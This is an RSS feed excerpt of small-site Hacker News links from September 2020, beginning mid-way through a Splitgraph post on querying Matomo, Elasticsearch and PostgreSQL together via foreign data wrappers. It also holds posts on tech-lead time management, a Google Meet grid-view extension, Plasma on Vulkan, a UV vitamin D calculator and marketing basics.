as="https://splitgraph.com/docs/concepts/images">data images</a> to/from Splitgraph</li><li>Using the <a href="https://www.splitgraph.com/docs/splitgraph-cloud/publish-rest-api" as="https://www.splitgraph.com/docs/splitgraph-cloud/publish-rest-api">REST API</a></li><li>Checking for updates: we use this to estimate the number of active <code>sgr</code> users</li></ul><p>We use <strong>Elasticsearch</strong> to log these and other interesting events.</p><p>Finally, we have a <strong>PostgreSQL</strong> database that stores actual user data. Some of it could be useful to know in an analytics context. For example: a user's primary e-mail address or their GitHub ID.</p></section><section><h2 id="how-to-bring-the-data-together">How to bring the data together?</h2><p>The idea for this setup came to us when we were trying to get some data from the Matomo Web UI. While it is pretty powerful, it's limited in the kinds of reports it can produce. Also, data we'd see in Matomo didn't include anything we store in Elasticsearch.</p><p>We wondered if we could query the data from Matomo's MySQL database directly. The <a href="https://developer.matomo.org/guides/database-schema" as="https://developer.matomo.org/guides/database-schema">schema</a>, albeit complex, is well documented on their website.</p><p>We could ingest data into Elasticsearch. However, we were already using Kibana to visualize Elasticsearch data and its visualizations were sometimes frustrating to use. Basic functionality like plotting sums is only available through scripted Elasticsearch fields.</p><p><img src="https://raw.githubusercontent.com/splitgraph/splitgraph.com/master/content/blog/images/20200918-splitgraph-matomo-elasticsearch-metabase/01-kibana.png"><em>Pictured: five different visualization engines that Kibana lets you use</em></p><p>But then we thought about it some more. Splitgraph itself is built on top of PostgreSQL. One of its features is making PostgreSQL <a href="https://www.splitgraph.com/blog/foreign-data-wrappers" as="https://www.splitgraph.com/blog/foreign-data-wrappers">foreign data wrappers</a> more user-friendly. Splitgraph's <code>sgr mount</code> lets you instantiate an FDW with a single command. You can then query the data directly or snapshot it.</p><p>Could we use a Splitgraph instance and add a MySQL FDW to it to query Matomo data?</p><p>And if we did, could we use an Elasticsearch FDW to proxy to our events data?</p><p>And if we did that, could we use something like <a href="https://www.metabase.com/" as="https://www.metabase.com/">Metabase</a> and point it at Splitgraph, letting it query data across all our data silos?</p><p>Turns out, we could. Here's an abridged version of how we mount Matomo data on a Splitgraph instance. We have a full set of commands on <a href="https://github.com/splitgraph/splitgraph/tree/master/examples/cross-db-analytics" as="https://github.com/splitgraph/splitgraph/tree/master/examples/cross-db-analytics">our GitHub</a>.</p><pre><code>sgr mount mysql_fdw matomo_raw -c matomo:$PASSWORD@matomo-db -o@- &lt;&lt;EOF
{
  "remote_schema": "matomo",
  "tables": {
    "matomo_log_action": {
      "hash": "bigint",
      "idaction": "integer",
      "name": "character varying(4096)",
      "type": "smallint",
      "url_prefix": "smallint"
    },
    "matomo_log_visit": {
      "idvisit": "bigint",
      "idvisitor": "bytea",
      "user_id": "character varying(200)",
      "location_ip": "bytea",
      "referer_url": "text",
      "visit_entry_idaction_name": "integer",
      "visit_entry_idaction_url": "integer",
      "visit_exit_idaction_name": "integer",
      "visit_exit_idaction_url": "integer",
      "visit_first_action_time": "timestamp without time zone",
      "visit_last_action_time": "timestamp without time zone",
      "visit_total_actions": "integer",
      "visitor_count_visits": "integer",
      "visitor_days_since_first": "smallint",
      "visitor_days_since_last": "smallint",
      "visitor_returning": "smallint"
    }
  }
}
EOF
</code></pre><p>In this, we just pull out interesting tables and columns from Matomo. The full Matomo schema spec for Splitgraph is available <a href="https://github.com/splitgraph/splitgraph/blob/master/examples/cross-db-analytics/mounting/matomo.json" as="https://github.com/splitgraph/splitgraph/blob/master/examples/cross-db-analytics/mounting/matomo.json">here</a>.</p><p>To query Elasticsearch, we used a <a href="https://github.com/splitgraph/postgres-elasticsearch-fdw" as="https://github.com/splitgraph/postgres-elasticsearch-fdw">fork</a> of <code>postgres-elasticsearch-fdw</code> with the ability to push down qualifiers. We made it available as an <code>sgr mount</code> subcommand. Here's an example:</p><pre><code>sgr mount elasticsearch -c elasticsearch:9200 -o@- &lt;&lt;EOF
{
  "table_spec": {
    "github_scraper_data": {
      "schema": {
        "id": "text",
        "@timestamp": "timestamp",
        "sg.github.stars": "integer",
        "sg.github.issues": "integer",
        "sg.github.downloads_installer": "integer",
        "sg.github.downloads_osx": "integer",
        "sg.github.downloads_linux": "integer",
        "sg.github.downloads_windows": "integer"
      },
      "index": "sg-misc*",
      "rowid_column": "id"
    }
  }
}
EOF
</code></pre><p>This creates a table that proxies to the data dumped by our GitHub star scraper.</p><p>Adding our PostgreSQL database was easy. We made an analytics user and gave it access a limited amount of useful tables (we wrote about our <a href="https://www.splitgraph.com/blog/integration-tests" as="https://www.splitgraph.com/blog/integration-tests">configuration and credential generation</a> before):</p><pre><code>sgr mount postgres_fdw sgr_auth -c [connstr] -o@- &lt;&lt;EOF
{
  "dbname": "auth",
  "remote_schema": "sgr_auth",
  "tables": [
    "user_emails",
    "profiles"
  ],
  "extra_server_args": {
    "use_remote_estimate": "true",
    "fetch_size": "10000"
  }
}
EOF
</code></pre></section><section><h2 id="sample-queries">Sample queries</h2><p>Let's now query Elasticsearch from Splitgraph and find out how many GitHub stars Splitgraph has:</p><pre><code metastring=""><span>SELECT</span> <span>"sg.github.stars"</span>
<span>FROM</span> elasticsearch_raw<span>.</span>github_scraper_data
<span>ORDER</span> <span>BY</span> <span>"@timestamp"</span> <span>DESC</span>
<span>LIMIT</span> <span>1</span><span>;</span>

 sg<span>.</span>github<span>.</span>stars

             <span>149</span>
<span>(</span><span>1</span> <span>row</span><span>)</span>
</code></pre><p>Only 149?! Make sure to <a href="https://github.com/splitgraph/splitgraph" as="https://github.com/splitgraph/splitgraph">star Splitgraph on GitHub</a> if you're reading this!</p><section><h3 id="federated-join">Federated JOIN</h3><p>As a real-world example, let's say we wanted to:</p><ul><li>Find users that visited our website in the last week</li><li>Also find out how many queries to our Data Delivery Network they made</li><li>Find out their e-mail addresses</li></ul><p>This data lives across three different databases, as discussed. With this setup, we can bring these three silos together with one simple SQL query:</p><pre><code metastring=""><span>SELECT</span>
    v<span>.</span>user_id<span>,</span>
    email<span>,</span>
    last_visit<span>,</span>
    <span>COALESCE</span><span>(</span>total_ddn_queries<span>,</span> <span>0</span><span>)</span> <span>AS</span> total_ddn_queries
<span>FROM</span> sgr_auth<span>.</span>user_emails ue
<span>LEFT</span> <span>OUTER</span> <span>JOIN</span> <span>(</span>
    
    <span>SELECT</span> <span>"sg.api.user_id"</span> <span>AS</span> user_id<span>,</span> <span>COUNT</span><span>(</span><span>1</span><span>)</span> <span>AS</span> total_ddn_queries
    <span>FROM</span> elasticsearch_raw<span>.</span>sql_api_queries
    <span>WHERE</span> <span>"sg.sql.used_images"</span> <span>IS</span> <span>NOT</span> <span>NULL</span>
    <span>GROUP</span> <span>BY</span> user_id
<span>)</span> d
<span>ON</span> ue<span>.</span>user_id::<span>text</span> <span>=</span> d<span>.</span>user_id
<span>JOIN</span> <span>(</span>
    
    
    <span>SELECT</span> user_id<span>,</span> <span>MAX</span><span>(</span>visit_last_action_time<span>)</span> <span>AS</span> last_visit
    <span>FROM</span> matomo_raw<span>.</span>matomo_log_visit v
    <span>WHERE</span> user_id <span>IS</span> <span>NOT</span> <span>NULL</span>
    <span>AND</span> AGE<span>(</span>visit_last_action_time<span>)</span> <span>&lt;</span> <span>'1 week'</span>
    <span>GROUP</span> <span>BY</span> user_id
<span>)</span> v
<span>ON</span> ue<span>.</span>user_id::<span>text</span> <span>=</span> v<span>.</span>user_id
<span>WHERE</span> ue<span>.</span>is_primary <span>IS</span> <span>TRUE</span>
<span>ORDER</span> <span>BY</span> last_visit <span>DESC</span><span>;</span>
</code></pre><p>Here's the query plan for it:</p><pre><code> Sort
   Sort Key: (max(v.visit_last_action_time)) DESC
   -&gt;  Hash Left Join
         Hash Cond: ((ue.user_id)::text = d.user_id)
         -&gt;  Hash Join
               Hash Cond: ((ue.user_id)::text = (v.user_id)::text)
               -&gt;  Foreign Scan on user_emails ue
                     Filter: (is_primary IS TRUE)
               -&gt;  Hash
                     -&gt;  HashAggregate
                           Group Key: v.user_id
                           -&gt;  Foreign Scan on matomo_log_visit v
                                 Filter: (age((CURRENT_DATE)::timestamp without time zone, visit_last_action_time) &lt; '7 days'::interval)
         -&gt;  Hash
               -&gt;  Subquery Scan on d
                     -&gt;  GroupAggregate
                           Group Key: sql_api_queries."sg.api.user_id"
                           -&gt;  Sort
                                 Sort Key: sql_api_queries."sg.api.user_id"
                                 -&gt;  Foreign Scan on sql_api_queries
                                       Filter: ("sg.sql.used_images" IS NOT NULL)
                                       Multicorn: Elasticsearch query to &lt;Elasticsearch([{'host': 'elasticsearch', 'port': 9200}])&gt;
                                       Multicorn: Query: {"query": {"bool": {"must": [{"exists": {"field": "sg.sql.used_images"}}]}}}
</code></pre><p>As you can see, this resolves into a Hash Join across three foreign tables. It also pushes down most of the clauses to the three origin databases:</p><pre><code>[PostgreSQL]
Foreign Scan on user_emails ue
  Filter: (is_primary IS TRUE)

[MySQL]
Foreign Scan on matomo_log_visit v
  Filter: (age((CURRENT_DATE)::timestamp without time zone, visit_last_action_time) &lt; '7 days'::interval)

[Elasticsearch]
-&gt;  Foreign Scan on sql_api_queries
  Filter: ("sg.sql.used_images" IS NOT NULL)
  Multicorn: Query: {"query": {"bool": {"must": [{"exists": {"field": "sg.sql.used_images"}}]}}}
</code></pre><p>Normally, this would require a data warehouse and a few separate ingestion pipelines. With Splitgraph and PostgreSQL, we can query the data at source. This idea is called "data virtualization" or a "data fabric". We call it a "database proxy".</p><p>Is data virtualization always the right solution? No, but it should be a starting point. If performance becomes a concern, we'll be able to snapshot these tables as Splitgraph images. Splitgraph stores data in a columnar format (using
<a href="https://www.splitgraph.com/docs/concepts/objects" as="https://www.splitgraph.com/docs/concepts/objects"><code>cstore_fdw</code></a>), so we'll be able to query it much faster.</p></section></section><section><h2 id="data-modelling">Data modelling</h2><p>We wrote a few views on these source foreign tables that wrangle the data and clean it up. For example (<a href="https://github.com/splitgraph/splitgraph/blob/master/examples/cross-db-analytics/mounting/matomo.sql" as="https://github.com/splitgraph/splitgraph/blob/master/examples/cross-db-analytics/mounting/matomo.sql">SQL on GitHub</a>),…</p></section></div></article></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.splitgraph.com/blog/splitgraph-matomo-elasticsearch-metabase">https://www.splitgraph.com/blog/splitgraph-matomo-elasticsearch-metabase</a></em></p>]]>
            </description>
            <link>https://www.splitgraph.com/blog/splitgraph-matomo-elasticsearch-metabase</link>
            <guid isPermaLink="false">hacker-news-small-sites-24542272</guid>
            <pubDate>Mon, 21 Sep 2020 11:58:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to find time to keep up with coding when you are a tech lead?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24542131">thread link</a>) | @quickthrower2
<br/>
September 21, 2020 | https://www.exploringreact.com/2020/09/18/how-to-find-time-to-keep-up-with-coding-when-you-are-a-tech-lead-3-tips-that-work-from-someone-who-has-been-there/ | <a href="https://web.archive.org/web/*/https://www.exploringreact.com/2020/09/18/how-to-find-time-to-keep-up-with-coding-when-you-are-a-tech-lead-3-tips-that-work-from-someone-who-has-been-there/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-30">
	

	<div>

		<!-- .entry-header -->

		
		<div>
			
<p>If you have recently been promoted to tech lead, or doing it for a while, you’ll deeply appreciate that there is hardly any time for coding, or maybe zero time at all.</p>



<p>There are a lot of people related things to do, project planning things to do, improving for the future or responding to emergencies. It can quickly turn into a blue screen of meeting appointments and none of them say “work on your favourite coding project”.&nbsp;</p>



<p>Of course you could code in your spare time, but let’s face it often we are too tired after working all day, and there are friends, hobbies and commitments outside of work.</p>



<p>You want to code more because, it is your passion! And also so you can understand what your team is talking about. And also if things go south, to pass a coding test for your next job! For me the main reason is because coding and building stuff is damn awesome!</p>



<h2>So how to get deep into some coding again?</h2>



<p>I have come up with the top 3 ways I know from experience will help you to keep up with coding. Not all of these will be instant – it might take a few weeks to work them in, but they will pay off and free up your time for coding, which is definitely a part of your job as a tech lead in most companies.</p>



<h3>1. Delegation</h3>



<p>Delegation is more than just dumping your work on other people and slapping your hands together with a grin. In-fact if you are not used to it, it can feel mentally harder than just doing the thing yourself. However you will be forced to delegate at some point due to your limit hours per week and so many Slacks and emails coming in. I suggest you actively choose what to delegate and be ruthless.</p>



<p>Delegation can be a whole blog post of book of it’s own. So I will reduce this down to one simple tip – each day try to delegate something that you previously would be loathed to delegate. What is that for you?</p>



<p>For me it is running the daily standups, I felt like that was a “Team Leaders Job” and that developers would be against doing this. However once I started doing it, well it worked out perfectly fine and I think we got a lot of benefits in terms of engagement in the meetings. If you know it’s your turn to run the meeting soon you probably won’t zone out.</p>



<p>The key point about delegation is to be clear what you are asking, and to follow up. It’s still your responsibility, it is just someone else is doing the heavy lifting for you now.</p>



<p>Once you get better or more used to delegation you’ll get more time for yourself to do what you want, including coding work.</p>



<h2>2. Keep it boring</h2>



<p>As a tech lead you are now the voice of reason, and you are thinking of the business. Convert everything to NoSQL, Kubernetes and NextJS? As a developer you might love a company that chooses a lot of new or different tech, it’s fun to learn and apply. However as a lead you need to think about what will actually pan out well, where the future issues and risks might lay.</p>



<p>By keeping the tech boring – by which I mean make well thought out and informed technology choices – you will do your team a big favour by helping make it easy to deliver things on time. It also increases your chance of being able to contribute.</p>



<p>Here you can carve out little 1 hour tasks that you can do yourself to keep you in the loop. An example is upgrading package dependencies and fixing any issues that introduces. As a result you would be forced to, for example look at the release notes for the next version of React or Typescript say and learn what is new. Hint – if you do this a lot it won’t be anything too exciting, some bug fixes and the odd feature.</p>



<p>By keeping it boring you increase the chance of you being able to contribute to the code, and keep coding.</p>



<h2>3. Choose some people to follow</h2>



<p>Go follow blogs from great developers such as <a href="https://overreacted.io/">Dan Abarmov</a>, or read an article from the <a href="https://martinfowler.com/">Martin Fowler</a> back catalog (he writes <a href="https://martinfowler.com/bliki/CodeAsDocumentation.html">timeless stuff</a>) can keep you up to date and learning new things. It is a very efficient method to find trusted distilled information. Be choosy about who you follow! And over time keep changing it up.</p>



<p>Come up with an easy to follow schedule, e.g. read one blog post per week, whatever is easy to achieve and start from there. Even better, read a post, then discuss it with your team as part of an appropriate meeting (e.g. you might have architectural meetings or such like), and see what everyone’s viewpoint is on the ideas in the post. You might even get an action out of it that will help you on your current workload.</p>



<p>By following blogs like these, you are not coding per-se, but you are learning which will help you keep up to date, and sometimes it will mean you discover a tool or way of doing things your team can take advantage of.&nbsp;</p>



<p>Now I have just given you a lot more stuff to do, which in itself might feel like a pain. It is an investment though. Try to anchor these onto something you already do. If you do one-on-one meetings for example you could add a “work to delegate” item to that agenda. Now you don’t have to think about this anymore, until you are in the meeting.</p>







<p>They are my 3 main tips for finding more time, hope you found it useful.</p>



<p>Now it is time to think about what you are going to do next. Here is what I recommend:</p>



<p>Of the 3 tips, if you are only going to do one, then work on delegation, and do the following right now:</p>



<p><em>(If you are not at work now, send an email to your work address to remind yourself when you are back in.)</em></p>



<ul><li><strong>Actions</strong>:<ul><li>Write down a quick summary of the stuff you need to do today at work.</li><li>Pick a task that you would normally be nervous for any reason to delegate to someone else.</li><li>Acknowledge the reason why you are nervous</li><li>Make sure you can describe the task in such a way you can hand it to someone in the team.</li><li>Pick the best person to do this, and tell them to do it.</li><li>Put a date in your calendar to follow up on the task</li><li>Put a date in your calendar to repeat this exercise</li></ul></li></ul>



<p>Well done you have now <em>really</em> delegated something, and once it is done, you will be able to delegate this task again and again.</p>



<p>Soon enough, you will find the problem is what tech work to work on in your newly freed up time. A good problem to have.</p>




<div><div><p><span>
	<h2>
		JavaScript Fatigue got you Reduxed?
	</h2>
	<p>
		It's often really hard to know what to learn next in the React world, where to spend your limited time as a developer, and how to keep up with all the tech changes and fads out there.
	</p><p>
However it doesn't really have to be like that. 
</p><p>
Focus on the core things that you really need to succeed, and build your satisfaction and career. Keep on top of it, by knowing what "it" really is.
</p><p>
Sign up for updates and you will get well researched and thoughtful articles that solve your problems, guide you and are based on real experience.
</p><p>
Sounds good? Just sign up below.

	</p>
	<p>
		Sign up in the form below for the latest articles and additonal tips by email:
	</p>


<div id="mlb2-2698196">
  <div>
    <div>
      <div>
        <div>
          <h4>YOUR REACTJS PROBLEMS SOLVED</h4>
          <p>Cut through the confusion! Sign up to get Martin's tips and advice for React JS.</p>
        </div>
        
      </div>
      
    </div>
  </div>
</div>

<img src="https://track.mailerlite.com/webforms/o/2698196/p7r9j4?v1600491917" width="1" height="1" alt=".">

	</span></p></div></div>					</div><!-- .entry-content -->

			</div><!-- .entry-inner -->
</article></div>]]>
            </description>
            <link>https://www.exploringreact.com/2020/09/18/how-to-find-time-to-keep-up-with-coding-when-you-are-a-tech-lead-3-tips-that-work-from-someone-who-has-been-there/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24542131</guid>
            <pubDate>Mon, 21 Sep 2020 11:37:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Grid View for Google Meet Extension Working 2020]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24542110">thread link</a>) | @PEOPFOIJIOFJIVD
<br/>
September 21, 2020 | https://www.w3technic.com/tutorials/google-meet-grid-view-chrome-extension/ | <a href="https://web.archive.org/web/*/https://www.w3technic.com/tutorials/google-meet-grid-view-chrome-extension/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Video tutorial</p><p><iframe src="https://www.youtube.com/embed/EsDzaO2DhoI" width="560" height="315" frameborder="0" allowfullscreen="allowfullscreen"></iframe></p><p>Â&nbsp;</p><div><h2 id="ftoc-heading-5">FAQ</h2><div><h3 id="ftoc-heading-6">What is Google Meet Grid View?</h3><p>Google Meet Grid View is an extension for Chrome allow users to add the grid view feature on Google Meet</p><p>Â&nbsp;</p><p><span>Adds a toggle to use a grid layout in Google Meet.</span></p><p><span>Â&nbsp;</span></p><p><span>Google Meet Grid View allows users to adds a button to use a grid layout in Google Meet.Â&nbsp;</span></p><p>Â&nbsp;</p><p><span>Google Meet Grid View adds a button to the top right bar (next to the chat &amp; participant list) to enable grid-view in Google Meet.Â&nbsp;</span></p><p>Â&nbsp;</p><p><span>Grid view gives every participant an equal-sized video for use in meetings without a primary speakerÂ&nbsp;</span><span>(such as working from home silent meetings ).</span></p><p>Â&nbsp;</p><p><span>Google Meet Grid View forcibly loads every participant’s video camera, when the grid view is enabled and may cause performance issues in extremely large meetings.</span></p><p>Â&nbsp;</p><p>Includes a variety of options to enhance your meeting: include your own video, highlight who is speaking, and hide participants without video!</p><h3 id="ftoc-heading-7">Extension Privacy Policy?</h3><p>This extension DOES NOT track any user data and therefore does not have a detailed privacy policy. If this is insufficient please email me at <a href="https://www.w3technic.com/cdn-cgi/l/email-protection" data-cfemail="e89fdb9c8d8b8086818ba88f85898184c68b8785">[email&nbsp;protected]</a></p><h3 id="ftoc-heading-8">I already installed Google Meet Grid View but it is not working?</h3></div></div><p>There are many reasons why Google Meet Grid View not working</p><p>Â&nbsp;</p><p><strong>Reason 1:</strong> You need to make sure that Grid View for Google Meet is the only grid extension has been installed. If 2 or more extensions been installed, it would have made the code did not work correctly</p><p>Â&nbsp;</p><p><strong>Reason 2:Â&nbsp;</strong>You do not active the extension, because of some reason the extension required user active it by our free secret code</p><p>Â&nbsp;</p><p>Here is the secret code if the extension required: <strong>gridview_ASJH13447_premium</strong> (Tutorials below)</p><h3 id="ftoc-heading-9">How to active the extension for the first time using</h3><p>Step 1: Copy the code <strong>gridview_ASJH13447_premiumÂ&nbsp;</strong></p><p>Step 2: Click the extension icon then you will see the form, please type the code -&gt; Click active</p></div></div>]]>
            </description>
            <link>https://www.w3technic.com/tutorials/google-meet-grid-view-chrome-extension/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24542110</guid>
            <pubDate>Mon, 21 Sep 2020 11:34:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Running PlasmaShell with Vulkan]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24541982">thread link</a>) | @ognarb
<br/>
September 21, 2020 | http://blog.davidedmundson.co.uk/blog/running-plasmashell-with-vulkan/ | <a href="https://web.archive.org/web/*/http://blog.davidedmundson.co.uk/blog/running-plasmashell-with-vulkan/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-309">
	
	<!-- .entry-header -->

	<div>
		
<p>QtQuick, in one word, is <em>amazing</em>. </p>
<p>QtQuick, in slightly more words, is a scene graph implementation. At a developer level we create abstract "Items" which might be some text or a rectangle etc or a picture. This in turn gets transformed into a tree of nodes with geometry, "materials" and transforms. In turn this gets translated into a big long stream of OpenGL instructions which we send to the graphic card.</p>
<p>Qt6 will see this officially change to sit on top of the "Render Hardware Interface" stack, that instead of always producing OpenGL, will support Vulkan, Metal and Direct3D natively. The super clever part about it is that custom shaders (low level fast drawing) are also abstracted; meaning we will write some GLSL and generate the relevant shader for each API without having to duplicate the work.</p>
<p>This blog series gives a lot more detail: <a href="https://www.qt.io/blog/qt-quick-on-vulkan-metal-direct3d">https://www.qt.io/blog/qt-quick-on-vulkan-metal-direct3d</a>.</p>
<p>Plasma code primarily interacts with Items and occasionally nodes, slightly above the level being abstracted. </p>

<p>Qt 5.15 ships with a tech preview of RHI and the Vulkan interface. I spent some time to set it up and explore what we need to do to get our side fully working. With some packages installed, a few plasma code fixes and some env vars set, I have a fully working Vulkan plasmashell.</p>
<h2>Screenshot</h2>
<p><a href="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/09/plasma_vulkan.png"><img src="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/09/plasma_vulkan-939x1024.png" alt=""></a></p>
<p>Unsurprisingly it looks the same, so a screenshot is very unexciting. I enabled the Mesa overlay as some sort of proof.<br>
The reason it shows 2fps is because plasmashell only updates when something has changed; in this case the textcursor blinking every 500ms.</p>
<p>Despite it being a preview it is in a damn good state! Things are usable, and really quite snappy, especially notification popups.</p>
<h2>What needs work</h2>
<p>Some things need work on our side, in particular:</p>
<ul>
<li>All of our custom shaders need porting to the updated shader language.</li>
<li>Taskbar thumbnails use low level GL code that needs one extra layer of implementation.</li>
<li>Use of QtQuickWidget in systemsettings. </li>
</ul>
<p>It means some elements are invisible or don't render with the full graphical effects, or in the last case, crash. </p>
<p>But in the whole scheme of things, everything is in a very encouraging state</p>
<h3>What about KWin?</h3>
<p>Whilst QtQuick is the cornerstone of plasmashell, systemsettings and so many applications, for historical reasons KWin made use of OpenGL before it was a mainstream part of Qt. Therefore this setup is mostly unrelated to KWin. Fortunately there's no reason these two have to be in sync.</p>

<p>This isn't usable for end users, and given it's only a tech preview upstream, this is not something we can ever expect to officially support within Plasma 5.</p>
<p>But we can start doing the prep work, also the current state is so promising I think we can deliver a native Vulkan experience to users on the first day of Plasma 6.</p>
	</div><!-- .entry-content -->

	
	<!-- .entry-footer -->

</article></div>]]>
            </description>
            <link>http://blog.davidedmundson.co.uk/blog/running-plasmashell-with-vulkan/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24541982</guid>
            <pubDate>Mon, 21 Sep 2020 11:10:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Calculator for UV Exposure Levels for Healthy Vitamin D]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24541857">thread link</a>) | @chippy
<br/>
September 21, 2020 | https://fastrt.nilu.no/VitD-ez_quartMEDandMED_v2.html | <a href="https://web.archive.org/web/*/https://fastrt.nilu.no/VitD-ez_quartMEDandMED_v2.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div action="/cgi-bin/olaeng/VitD-ez_quartMEDandMED.cgi" enctype="application/x-www-form-urlencoded" method="POST">
<b>Time and location
</b><p>
<b>Month</b>

<b>Day</b>

</p><p>
 <b>City</b>
<br>
 <b>Latitude (degs N) </b> <spacer>
<b>Longitude (degs E) </b>  <a href="https://www.yr.no/forsida.aspx?spr=eng">Search for decimal longitudes and latitudes as well as weather </a>

</spacer></p><hr>
<b>Skin type: </b>Pale Caucasian
    Blond Caucasian
    Darker Caucasian
    Mediterranean
    Middle Eastern
    Black
<hr>
<b>Nature of exposure: </b> Around midday
     Start time (hours UTC)  <a href="http://www.worldtimeserver.com/current_time_in_UTC.aspx">What is UTC?</a>

<hr>
<b>Sky condition</b>


<!--
<INPUT TYPE="radio" NAME="UVI_flag" VALUE=1> Estimate cloud thickness from UV index assuming overcast sky: UV Index [0-20] <INPUT TYPE="text" NAME="UVI" VALUE="4.3" SIZE="5"> -->
<br>
<hr>

<b>Ozone layer thickness</b>
<br>
<hr>

<b>Surface elevation</b> 
km above sea level. Range [0.0-6.0] km
<p>
<b>Surface type</b>

</p><hr>
<address>
<span size="-1">
<!-- Contact: <A HREF="mailto:arve.kylling@nilu.no">Arve Kylling</A> or <A HREF="mailto:tove.svendby@nilu.no">Tove Svendby</A> <BR> -->
Contact: <a href="mailto:nilu@nilu.no">nilu@nilu.no</a> (Arve Kylling or Tove Svendby) <br>
<a href="http://www.nilu.no/">NILU - Norwegian Institute for Air Research</a> <br>
Instituttveien 18 <br> 
NO-2027 Kjeller <br>
Norway <br>
</span></address><span size="-1">
<br>
</span>


</div></div>]]>
            </description>
            <link>https://fastrt.nilu.no/VitD-ez_quartMEDandMED_v2.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24541857</guid>
            <pubDate>Mon, 21 Sep 2020 10:46:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to think about marketing – A guide for newbies]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24541847">thread link</a>) | @prank7
<br/>
September 21, 2020 | https://ramenpotential.com/understanding-marketing | <a href="https://web.archive.org/web/*/https://ramenpotential.com/understanding-marketing">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>This article is a part of the series that I am writing on marketing while learning and implementing it in public. Learn <a href="https://ramenpotential.com/marketing">more about it here.</a></p>
<p>Any act of communication between a business and the outside world is marketing.</p>
<ul>
<li>Our landing page</li>
<li>Our social media post</li>
<li>Our offers</li>
<li>Our product</li>
</ul>
<p>Everything is marketing.</p>
<p>In words of marketing guru Peter Drucker - <b>"Ideally, marketing should result in a customer who is ready to buy."</b></p>
<p>To get a customer to buy, there are two crucial steps that marketing should do -</p>
<h3>1. Improve reach</h3>
<p>Improve discoverability and awareness about the business to increase reach.</p>
<h3>2. Build trust</h3>
<p>Build a level of trust that the potential customers feel comfortable getting in to a relationship (become a user of the product).</p>
<hr>
<h3>Digging deeper into reach</h3>
<p><img src="https://ramenpotential.com/images/marketing-reach-and-trust.png" alt="Marketing activities for trust and reach"></p>
<p>Here are a few marketing activities that can improve reach and discoverability.</p>
<h4 id="content-marketing">1. Content Marketing</h4>
<p>Before we look for specific means and tactics of doing content marketing. Let's understand why it works.</p>
<p>At the very core of the internet is inter-linked content. Whether you do a query on search engines, scroll through feed on social media or watch videos on youtube, even the journey to getting to utility products starts with searching and engaging with content.</p>
<p>People are looking for content that does atleast one of these two things -</p>
<ol>
<li>Educate them - They want to be educated on the problems that they have</li>
<li>Entertain them - They want to be entertained</li>
</ol>
<p>In marketing, when they say <code>provide value</code> to attract customers, they mean either educate them or entertain them.</p>
<blockquote>
  <p>Good marketing either educates or entertains potential customers.</p>
</blockquote>
<p>When people relevant to our domain look for the solution to their problems, we have to be present there with our content. This makes our business inbound discoverable. It is also the most valuable, meaningful and long term result yielding form of marketing.</p>
<p>Of course, this needs a deep understanding of what our customers are looking for and where they are looking for it.</p>
<p>🛑 Taking this approach of marketing has a few deterrents -</p>
<ol>
<li>We have to really know what our customers are looking for and where.</li>
<li>It's a long game. It takes about 6-9 months for this effort to start producing results.</li>
<li>Producing good content consistently without seeing immediate success is hard.</li>
</ol>
<p>📈 That said, it also has multifold advantages -</p>
<ol>
<li>The more content we produce, the larger the compounding effect is. Over a period of time, small gains accumulate and result in massive traffic.</li>
<li>Just the act of producing content and seeing which one performs well give us insight into our customers which is extremely valuable to base our business and product strategies on.</li>
<li>When we educate, it builds trust with potential customers, which we will talk about in the next section.</li>
</ol>
<p>At an execution level, there are many tactics which I will write about in detail as I go about implementing them.</p>
<div>
<h5>Action steps</h5>
<ol>
<li>
<p>Understand what our customers are looking for and where</p>
<ul>
<li>It dictates topics and media that we produce content on. E.g. Blog, Podcast, Videos etc.</li>
<li>Come up with a list of places we should distribute content</li>
</ul>
</li>
<li>
<p>Produce content that educates or entertains</p>
<ul>
<li>Has short term gains through our content distribution channels like social media</li>
<li>Results in better SEO, better discoverability in long term.</li>
</ul>
</li>
</ol>
<p>There are levers that we can use here to amplify our reach. For example, standing on the shoulder of giants to distribute content.</p>
<ul>
<li>Guest posting</li>
<li>Appearing on podcasts</li>
</ul>
</div>
<h4 id="ads">2. Ads</h4>
<p>Publishing ads on various platforms can result in quick, short-term discoverability. It's good to try it out and see the results.</p>
<p>It does its job of making our business discoverable but it doesn't really build any trust.</p>
<div>
<h5>Action steps</h5>
<ul>
<li>Find out which platforms does our customers hangout on</li>
<li>Play around with running ads, analyze results and iterate</li>
</ul>
</div>
<h4 id="events">3. Events</h4>
<p>There is a range of events from product launches to webinars that help in improving visibility.</p>
<p>A product launch, done right, puts us in front of the customers. It's not a sustainable stream of traffic but is good to get the word out.</p>
<p>Webinars are a great opportunity to educate people, results in content that we can use over and over. Gives facetime with customers and can be immensely valuable to them.</p>
<p>There are some other ways of becoming more discoverable e.g. PR, affiliates, influencer marketing etc. I am skipping going in detail about them right now.</p>
<hr>
<h3>2. Building trust</h3>
